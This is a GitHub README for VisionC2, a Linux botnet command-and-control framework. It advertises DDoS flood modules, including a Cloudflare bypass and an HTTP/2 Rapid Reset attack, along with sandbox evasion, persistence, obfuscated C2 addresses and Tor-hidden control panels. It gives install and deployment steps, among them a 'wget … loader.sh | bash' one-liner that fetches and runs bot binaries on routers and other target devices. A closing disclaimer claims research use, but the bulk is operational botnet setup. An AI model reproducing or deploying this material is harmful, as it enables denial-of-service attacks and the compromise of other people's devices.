
<div align="center">

# VisionC2

### Advanced Linux C2 Framework — Modular, Encrypted, Cross-Architecture

<br>

| | |
|:-:|:-:|
| 🧩 **Modular Bot Builds**<br>Pick your payload: full DDoS arsenal, SOCKS5 proxy mesh, lightweight remote shell, or all of the above. Select modules at compile time| 🔒 **Fully Static Binaries**<br>Every binary runs on any Linux kernel: ancient routers, uClibc embedded devices, minimal containers. All 14 architectures produce a `statically linked` ELF. |
| 🛡️ **Encrypted Everything**<br>TLS 1.3 on port 443. AES-256-CTR config encryption with unique per-build keys. C2 address buried under 6 layers — Base64, XOR, RC4, byte substitution, MD5 checksum, AES-CTR. HMAC challenge-response auth on every connection. Zero plaintext in the binary. | 🖥️ **3 Control Interfaces**<br>Tor hidden service web panel (zero clearnet exposure). Interactive Go TUI. Telnet CLI for remote/multi-user access. RBAC across all three with 4 permission tiers. Single `users.json` shared between all interfaces. |

<br>

[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
[![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)]()
[![Architectures](https://img.shields.io/badge/Architectures-14-blueviolet?style=for-the-badge)](#deploying-bots)
[![Changelog](https://img.shields.io/badge/Changelog-Docs-f59e0b?style=for-the-badge)](Docs/CHANGELOG.md)

<br>

<details>
<summary><b>📸 Web Panel (Tor Hidden Service)</b></summary>
<br>
<img src="https://github.com/user-attachments/assets/e6bbfd83-725f-4881-8b9d-c6be45b88f27" alt="VisionC2 Tor Panel" width="100%">
</details>

<details>
<summary><b>📸 Remote Shell & File Browser</b></summary>
<br>
<img width="1378" height="857" alt="image" src="https://github.com/user-attachments/assets/1885ebfe-ff79-4b05-a084-28e565454824">
</details>

<details>
<summary><b>📸 Attack Builder Interface</b></summary>
<br>
<img width="2353" height="866" alt="image" src="https://github.com/user-attachments/assets/ea1c9717-98a1-4400-9895-cb480f4feb06">
</details>

<details>
<summary><b>📸 User Management Panel</b></summary>
<br>
<img width="2375" height="1017" alt="image" src="https://github.com/user-attachments/assets/21b33bf9-ccbf-4197-933e-fc28b85923fe">
</details>

<details>
<summary><b>📸 Scheduled Tasks View</b></summary>
<br>
<img width="2365" height="535" alt="image" src="https://github.com/user-attachments/assets/e3051202-253b-46e8-9deb-680580c24602">
</details>

</div>

---

## 📋 Table of Contents

- [Quick Start](#quick-start)
- [Architecture Overview](#architecture-overview)
- [Attack Methods](#attack-methods)
- [Bot Deployment](#bot-deployment)
- [Control Interfaces](#control-interfaces)
- [Documentation](#documentation)
- [Legal Disclaimer](#legal-disclaimer)

---

##  Quick Start

### System Requirements

| Requirement | Minimum | Recommended |
|-------------|---------|-------------|
| **RAM** | 512MB | 2GB+ |
| **Storage** | 1GB | 10GB+ |
| **Network** | Port 443 inbound | Static public IP |
| **OS** | Ubuntu 20.04+ | Ubuntu 22.04+ |

### Install Dependencies

```bash
sudo apt update && sudo apt install -y openssl git wget python3 screen tor upx-ucl

# Install Go 1.24+
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
```

### One-Command Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py
```

Select **[1] Full Setup** and follow the interactive wizard. You'll be prompted for:

- C2 server address (IP or domain)
- Admin interface port
- TLS certificate details
- Bot module selection (attacks/SOCKS/both)

### Build Outputs

After setup completes, you'll find:

```
VisionC2/
├── bins/              # 14 bot binaries (one per architecture)
├── server             # CNC control binary
├── relay_server       # SOCKS relay binary
├── cnc/certificates/  # TLS key pair
└── setup_config.txt   # Full configuration backup
```

### Start the CNC Server

```bash
./server              # Interactive launcher (choose mode at startup)
./server --tui        # Direct TUI mode
./server --split      # Telnet CLI on admin port
./server --daemon     # Headless mode (no local UI)
```

**Run persistently:** `screen -S vision ./server` — detach with `Ctrl+A D`

---

##  Setup Configuration Options

| Option | Description |
|--------|-------------|
| **[1] Full Setup** | New C2 address, AES key, tokens, certificates, and bot builds |
| **[2] C2 URL Update** | Change C2 address only — preserves magic code, certs, tokens |
| **[3] Module Update & Rebuild** | Change bot module selection — preserves everything else |
| **[4] Restore from setup_config.txt** | Restore saved config after `git pull` or fresh clone |

---

##  Architecture Overview

```
┌─────────────┐       TLS 1.3 / 443        ┌─────────────┐
│  Operator    │◄── Tor Hidden Service ────►│  CNC Server │
│ (Browser /   │                            │   cnc/      │
│  TUI / Tel)  │                            └──────┬──────┘
└─────────────┘                                    │
                                         TLS 1.3 / 443
                                                   │
                         ┌─────────────────────────┼─────────────────────────┐
                         │                         │                         │
                   ┌─────┴─────┐             ┌─────┴─────┐             ┌─────┴─────┐
                   │    Bot    │             │    Bot    │             │    Bot    │
                   │  (arm64)  │             │  (x86_64) │             │  (mips)   │
                   └───────────┘             └───────────┘             └───────────┘
```

### Component Breakdown

| Component | Path | Role |
|-----------|------|------|
| **CNC Server** | `cnc/` | Central C2 — TLS 443 for bots, embedded Tor hidden service, TUI + Telnet CLI, RBAC |
| **Bot Agent** | `bot/` | Deployed agent — TLS 1.3, 6-layer C2 decoding, sandbox evasion, persistence, optional attacks/SOCKS |
| **SOCKS Relay** | `cnc/relay/` | SOCKS5 relay — bots backconnect, users connect via SOCKS5 port, disposable VPS infrastructure |
| **Tooling** | `tools/` | Build script (`build.sh`), crypto helper, deployment loader |

---

##  Attack Methods

### Layer 4 (Network Layer)

| Method | Description |
|--------|-------------|
| **UDP Flood** | High-volume 1024-byte UDP payloads |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | Randomized source ports via raw TCP |
| **ACK Flood** | ACK packet spam via raw TCP |
| **GRE Flood** | Protocol 47, maximum payload |
| **DNS Flood** | Randomized query types against resolver pool |

### Layer 7 (Application Layer)

| Method | Description |
|--------|-------------|
| **HTTP Flood** | GET/POST with randomized headers and user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse and fingerprinting |
| **Rapid Reset** | HTTP/2 CVE-2023-44487 — HEADERS + RST_STREAM at scale |

> **Note:** All L7 methods support HTTP and SOCKS5 proxy rotation via `-p <proxy_list_url>`.

---

##  SOCKS5 Proxy System

Bots backconnect to a relay server — they **never open inbound ports**. The relay accepts SOCKS5 clients on its public port and tunnels traffic through the bot to the target.

```
Client → [SOCKS5] → Relay ←── [backconnect TLS] ──← Bot → Target
```
  > Direct SOCKS5 on bot also available incase no relay server

### Key Features

- **Zero inbound ports** on bots — bypasses firewalls
- **Dynamic relay management** — add/remove relays from CNC dashboard without rebuilds
- **Disposable infrastructure** — rotate relay servers seamlessly

---

##  Bot Deployment

### 1. Host Binaries

Host compiled binaries on a separate VPS:

```bash
sudo apt install -y apache2
sudo cp bins/* /var/www/html/bins/
sudo systemctl start apache2
```

### 2. Configure Loader

Edit `tools/loader.sh` line 3 with your hosting server IP:

```bash
SRV="http://<your-server-ip>/bins"
```

### 3. Deploy

The loader auto-detects target architecture and fetches the matching binary from the 14 available variants:

```bash
wget -qO- http://your-server/loader.sh | bash
```

### Supported Architectures

| Architecture | Status | Use Case |
|--------------|--------|----------|
| x86, x86_64 | ✅ Full | Standard servers, desktops |
| ARM v5/v6/v7 | ✅ Full | Older embedded, routers |
| ARM64 | ✅ Full | Modern ARM servers, SBCs |
| MIPS, MIPS64 | ✅ Full | Routers, networking gear |
| PPC64 | ✅ Full | IBM Power systems |
| s390x | ✅ Full | IBM Z mainframes |
| RISC-V | ✅ Full | Emerging architecture |

---

##  Control Interfaces

<img src="https://github.com/user-attachments/assets/b979ffcc-082f-47be-ac8d-206c751fa8f9" alt="VisionC2 TUI" width="100%">

| Interface | Access Method | Best For |
|-----------|---------------|----------|
| **Tor Web Panel** | `.onion` via Tor Browser | Full GUI — attack builder, shell, bot management, SOCKS control, activity log, user admin |
| **Go TUI** | `./server --tui` | Local interactive terminal with live bot feed and attack launcher |
| **Telnet CLI** | `./server --split` | Lightweight remote access, multi-user, scriptable operations |

### Role-Based Access Control (RBAC)

All three interfaces share `users.json` with four permission tiers:

| Role | Permissions |
|------|-------------|
| **Admin** | Full system control, user management |
| **Operator** | Attack execution, bot management |
| **Viewer** | Read-only monitoring |
| **Relay Only** | SOCKS relay operations only |

---

##  Documentation

| Document | Description |
|----------|-------------|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | System design, encryption layers, protocol details |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Full version history and updates |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Complete TUI command and hotkey reference |
| [`SETUP.md`](Docs/SETUP.md) | Detailed installation and configuration guide |
| [`PROXY.md`](Docs/PROXY.md) | SOCKS5 relay deployment and configuration |

---

## 🔧 Troubleshooting

<details>
<summary><b>"go: command not found" or wrong Go version</b></summary>

```bash
export PATH=$PATH:/usr/local/go/bin
go version  # should show 1.24+
```
</details>

<details>
<summary><b>"Permission denied" when starting server on port 443</b></summary>

```bash
sudo setcap 'cap_net_bind_service=+ep' ./server
```
</details>

<details>
<summary><b>Bots won't connect to CNC</b></summary>

- Confirm port 443 is open: `sudo ufw allow 443/tcp`
- Verify C2 address in `setup_config.txt` matches your server's public IP
- Test TLS connectivity: `openssl s_client -connect YOUR_IP:443`
- Enable verbose logging: rerun `setup.py` with debug mode ON
</details>

<details>
<summary><b>Relay server won't start</b></summary>

- Check port availability: `ss -tulpn | grep :1080`
- Ensure binary is executable: `chmod +x relay_server`
- Verify auth key matches CNC magic code in `setup_config.txt`
</details>

<details>
<summary><b>Web panel not accessible via Tor</b></summary>

- Verify Tor is running: `systemctl status tor`
- Check hidden service hostname: `sudo cat /var/lib/tor/hidden_service/hostname`
- Ensure `torrc` contains: `HiddenServicePort 80 127.0.0.1:8080`
</details>

---

##  Legal Disclaimer

**For authorized security research and educational purposes only.**

Usage against systems without explicit prior consent is **illegal**. The developer assumes **no liability** for misuse, unauthorized access, or any damages caused by this software.

**By using this software, you agree that you:**
- Have obtained proper authorization for all testing
- Will comply with all applicable laws and regulations
- Accept full responsibility for your actions

---

<div align="center">

**Developed by Syn2Much** — [hell@sinners.city](mailto:hell@sinners.city) | [@synacket](https://x.com/synacket)

---

⭐ **Star this repository** if you find it useful for research purposes

</div>
